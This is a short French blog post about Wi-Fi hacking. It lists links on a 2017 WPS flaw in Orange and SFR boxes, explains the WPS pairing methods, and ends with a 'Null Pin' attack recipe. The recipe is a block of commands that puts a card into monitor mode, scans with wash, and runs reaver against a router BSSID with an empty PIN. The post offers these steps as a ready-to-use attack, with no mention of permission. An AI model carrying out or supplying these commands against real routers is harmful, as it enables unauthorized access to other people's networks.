---
layout: post
title:  "Un peu de wifi"
date:   2024-03-27 11:35:09 +0200
categories: jekyll update
permalink: /wifi/
image: /assets/uploads/wifi.jpg
---

# Liens et documentations
<pre>

https://www.canardwifi.com/2017/08/15/faille-de-securite-wps-critique-sur-les-livebox-et-box-sfr/

https://www.macg.co/materiel/2017/08/une-faille-de-securite-avec-le-wps-dans-les-box-orange-et-sfr-99409

https://lafibre.info/attaques/faille-de-securite-wifi-wps-chez-sfr-et-orange/

[https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.canardwifi.com%2Fwp-content%2Fcwuploads%2Ffaille-wps-pin-null-script-boxon.png&tbnid=UskTM2MZQvBhEM&vet=12ahUKEwiWjaDfvfWCAxX5sCcCHRWxCHgQMygTegQIARBY..i&imgrefurl=https%3A%2F%2Fwww.canardwifi.com%2F2017%2F08%2F15%2Ffaille-de-securite-wps-critique-sur-les-livebox-et-box-sfr%2F&docid=4_8l8CSduxFYgM&w=909&h=459&q=null pin wps&ved=2ahUKEwiWjaDfvfWCAxX5sCcCHRWxCHgQMygTegQIARBY](https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.canardwifi.com%2Fwp-content%2Fcwuploads%2Ffaille-wps-pin-null-script-boxon.png&tbnid=UskTM2MZQvBhEM&vet=12ahUKEwiWjaDfvfWCAxX5sCcCHRWxCHgQMygTegQIARBY..i&imgrefurl=https%3A%2F%2Fwww.canardwifi.com%2F2017%2F08%2F15%2Ffaille-de-securite-wps-critique-sur-les-livebox-et-box-sfr%2F&docid=4_8l8CSduxFYgM&w=909&h=459&q=null%20pin%20wps&ved=2ahUKEwiWjaDfvfWCAxX5sCcCHRWxCHgQMygTegQIARBY)

https://null-byte.wonderhowto.com/how-to/hack-wi-fi-selecting-good-wi-fi-hacking-strategy-0162526/

https://null-byte.wonderhowto.com/how-to/automate-wi-fi-hacking-with-wifite2-0191739/

https://www.wonderhowto.com/search/reaver/
</pre>

# Comment faire une super attaque Null Pin



Une attaque Null Pin est un type d'attaque Wifi qui concerne plus particulièrement l'authentification WPS des boxs (box ou routeur personnel seront synonyme ici). 

Souvent oubliés, dans certains cas mis à jour et dans la majorité non-désactivé le WPS permet une authentification sur la box plus simple sans passer par le protocole 

WPA. Ce qui veut dire pas de WPA handshake et pas de mot de passe à ralonge. Il s'agit souvent d'appuyer sur un bouton de la box pour autoriser l'authentification de 

n'importe quel appareil à proximité. Mais il existe aussi d'autre méthode : 

la méthode PIN (Personal Identification Number), un numéro à lire sur une étiquette (ou un écran) du nouvel appareil, et à reporter sur le « représentant » du réseau 
(le point d'accès ou le registraire) ;

la méthode PBC (Push Button Configuration), où l'utilisateur presse un bouton (physique ou virtuel), à la fois sur le point d'accès et sur le nouvel appareil ;

la méthode NFC (Near Field Communication), où l'utilisateur approche le nouvel appareil du point d'accès pour établir une communication en champ proche entre eux ;

la méthode USB (Universal Serial Bus, comme D-link le fait pour la plupart des clés USB wifi), où l'utilisateur se sert d'une clé USB pour transférer les données entre 
le nouvel appareil et le point d'accès.

Ainsi la méthode PIN est bien souvent vulnerable et attaquée. La méthode Null Pin consiste à envoyer un PIN null ("") et pour cela on va utiliser l'outil Reaver
<pre>
Wifi:

Null pin :

---

Ifconfig wlan1 down

Iwconfig wlan1 mode monitor

Ifconfig wlan1 up

Wash -i wlan1

reaver -b 07:22:56:24:13:29 -i wlan1 -p “”
</pre>